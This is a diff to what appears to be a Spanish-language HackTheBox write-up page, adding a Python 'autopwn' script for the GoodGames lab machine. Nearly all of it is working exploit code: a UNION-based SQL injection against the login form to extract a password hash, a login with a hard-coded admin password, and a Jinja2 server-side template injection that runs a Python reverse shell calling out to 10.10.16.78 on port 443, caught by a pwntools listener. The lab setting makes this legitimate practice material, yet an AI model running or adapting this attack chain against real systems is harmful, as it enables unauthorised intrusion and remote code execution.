@@ -1,6 +1,90 @@
 ---
 layout: content
 ---
+
+<p> </p>
+
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">GoodGames - HackTheBox</h2>
+
+Este *Script* explota una inyección `SQL` para interceptar un hash `MD5`, también aprovecha un `Server Side Template Injection` para derivar a la ejecución de código arbitrario mediante sentencias maliciosas de `Jinja2`.
+
+* Acceso como `root` en `contenedor`
+* Shell interactivo
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import re
+import signal
+import sys
+from requests import get,post,session
+
+def def_handler(sig,frame):
+	print("Saliendo")
+	sys.exit(1)
+signal.signal(signal.SIGINT, def_handler)
+
+class Exploit():
+	def __init__(self, main_url, subdomain, password):
+		self.__url = main_url
+		self.__subdomain = subdomain
+		self.__pass = password
+	
+	def extract_hash(self):
+
+		data_sqli = {
+			'email': """' union select 1,2,3,password from main.user-- -""",
+			'password': 'guest'
+		}
+		p1 = log.progress("Hash")
+
+		r = post(self.__url+'/login', data=data_sqli)
+		hash_MD5 = re.findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text)[0]
+		
+		p1.success(hash_MD5[0:32])
+
+	def rce_ssti(self):
+
+		s = session()
+		s.verify = False 
+
+		r = get(self.__subdomain+'/login')
+		csrf_token = re.findall(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]
+
+		data_login = {
+			'csrf_token': csrf_token,
+			'username': 'admin',
+			'password': 'superadministrator',
+			'login': ''
+		}
+
+		r = s.post(self.__subdomain+'/login', data=data_login)
+		
+		# Cambiar IP por la vuestra
+
+		data_ssti = {
+			'name': r'''{{ cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read() }}'''
+		}
+
+		r = s.post(self.__subdomain+'/settings', data=data_ssti)
+
+autopwn = Exploit('http://goodgames.htb', 'http://internal-administration.goodgames.htb', 'superadministrator')
+
+def main():
+	autopwn.extract_hash()
+	autopwn.rce_ssti()
+
+if __name__ == '__main__':
+	try:
+		threading.Thread(target=main, args=()).start()
+	except Exception as e:
+		log.error(str(e))
+
+shell = listen(443, timeout=20).wait_for_connection()
+shell.interactive()
+``` 
+
 <p> </p>
 
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Horizontall - HackTheBox</h2>
